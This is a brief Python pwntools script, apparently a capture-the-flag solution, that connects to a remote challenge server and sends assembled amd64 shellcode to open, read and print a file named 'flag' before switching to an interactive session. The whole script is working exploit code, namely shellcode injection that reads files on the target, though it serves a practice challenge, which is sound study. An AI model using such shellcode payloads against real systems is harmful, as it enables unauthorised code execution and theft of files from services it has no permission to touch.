from pwn import *


# p = process("./asm")
p = remote("node4.buuoj.cn", 27232)

context(os="linux", arch="amd64")


addr = 0x41414000
code = shellcraft.open("flag")
code += shellcraft.read(3, addr, 0x30)
code += shellcraft.write(1, addr, 0x30)
code = asm(code)

p.send(code)

p.interactive()


